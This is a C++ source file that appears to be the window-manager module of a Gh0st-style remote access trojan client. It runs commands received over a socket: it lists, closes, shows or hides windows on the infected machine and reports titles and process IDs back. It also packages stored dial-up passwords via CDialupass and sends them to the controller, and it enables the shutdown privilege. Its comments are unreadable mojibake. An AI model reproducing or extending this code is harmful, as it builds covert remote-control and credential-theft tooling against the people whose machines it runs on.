// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "CWindowsManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount);

CWindowsManager::CWindowsManager(CClientSocket* pClient, BYTE bHow) : CManager(pClient)
{
	m_caseSystemIs = bHow;
	if (m_caseSystemIs == COMMAND_WINDOWS)     
	{
		SendWindowsList();
	}
}

CWindowsManager::~CWindowsManager()
{

}
void CWindowsManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	SwitchInputDesktop();
	switch (lpBuffer[0])//�����ǽ��̹���������ݵĺ����� �ж����ĸ�����
	{
	case COMMAND_WSLIST:				//���ʹ����б�
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:				//����20200530
		break;
	case COMMAND_WINDOW_CLOSE:			//�رմ���
		CloseTheWindow(lpBuffer + 1);
		break;
	case COMMAND_WINDOW_TEST:			//�����С�� ���ش��ں�
		ShowTheWindow(lpBuffer + 1);
		break;
	default:
		break;
	}
}


void CWindowsManager::SendWindowsList()
{
	UINT	nRet = -1;
	//��ȡ�����б�����
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	//���ͱ������Ĵ�������
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


//����20200530
void CWindowsManager::SendDialupassList()
{
	CDialupass	pass;

	int	nPacketLen = 0;
	int i = 0;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}

	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);

	DWORD	dwOffset = 1;

	for (i = 0; i < pass.GetMax(); i++)
	{

		COneInfo* pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}

	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);

}


//��Ȩ
bool CWindowsManager::DebugPrivilege(const char* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}

void CWindowsManager::ShutdownWindows(DWORD dwReason)
{
	DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}

//���ڻص��������д���
bool CALLBACK CWindowsManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE*)lParam;

	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	//��ȡ�������Ĵ��ھ���ı���
	if (IsWindowVisible(hwnd))
		return true;
	//GetWindowText(hwnd, strTitle, sizeof(strTitle));
	GetWindowTextSafe(hwnd, strTitle, sizeof(strTitle));
	//�жϴ����Ƿ�ɼ��������Ƿ�Ϊ��
	if (lstrlen(strTitle) == 0)
	{
		OutputDebugString("lstrlen");
		return true;
	}

	//���ָ��Ϊ�յĻ�����һ����
	//���ú���ʱѭ�������Եڶ��ν����Ͳ��ǿյģ��ö�̬��LocalReAlloc�ı�Ѵ�Сʵ�����ݶ���һ�����ϣ�
	if (lpBuffer == NULL)
		//��һ�������СΪ1����Ϊ��һ�ֽ�Ϊ֪ͨ���ƶ˱�ʶ
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);

	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);

	//���㻺������С
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);

	//��ȡ���ڵĴ����� + ����memcpy���ݽṹΪ ������PID + hwnd + ���ڱ��� + 0
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);

	*(LPBYTE*)lParam = lpBuffer;

	return true;
}


//��ȡ�����б�����
LPBYTE CWindowsManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;

	//ö����Ļ�ϵ����еĶ��㴰�ڣ������ؽ���Щ���ڵľ�����ݸ�һ��Ӧ�ó�����Ļص�������
	//EnumWindows��һֱ������ȥ��ֱ��ö�������еĶ��㴰�ڣ����߻ص�����������FALSE.
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);

	//����ͷ���TOKEN_WSLIST���ض�ʶ��
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}


//�رմ���
void CWindowsManager::CloseTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));				//�õ����ھ�� 
	::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0);	//�򴰿ڷ��͹ر���Ϣ
}

//��ʾ����
void CWindowsManager::ShowTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(DWORD));				//�õ����ھ��
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));		//�õ����ڴ������
	ShowWindow((HWND__*)hwnd, dHow);
}


int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount)
{
	if (NULL == hWnd || FALSE == IsWindow(hWnd) || NULL == lpString || 0 == nMaxCount)
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}
	DWORD dwHwndProcessID = 0;
	DWORD dwHwndThreadID = 0;
	dwHwndThreadID = GetWindowThreadProcessId(hWnd, &dwHwndProcessID);		//��ȡ���������Ľ��̺��߳�ID

	if (dwHwndProcessID != GetCurrentProcessId())		//���ڽ��̲��ǵ�ǰ���ý���ʱ������ԭ������
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}

	//���ڽ����ǵ�ǰ����ʱ��
	if (dwHwndThreadID == GetCurrentThreadId())			//�����߳̾��ǵ�ǰ�����̣߳�����ԭ������
	{
		return GetWindowText(hWnd, lpString, nMaxCount);
	}

#ifndef _UNICODE
	WCHAR* lpStringUnicode = new WCHAR[nMaxCount];
	InternalGetWindowText(hWnd, lpStringUnicode, nMaxCount);
	int size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, NULL, 0, NULL, NULL);
	if (size <= nMaxCount)
	{
		size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, lpString, size, NULL, NULL);
		if (NULL != lpStringUnicode)
		{
			delete[]lpStringUnicode;
			lpStringUnicode = NULL;
		}
		return size;
	}
	if (NULL != lpStringUnicode)
	{
		delete[]lpStringUnicode;
		lpStringUnicode = NULL;
	}
	return 0;

#else
	return InternalGetWindowText(hWnd, lpString, nMaxCount);
#endif
}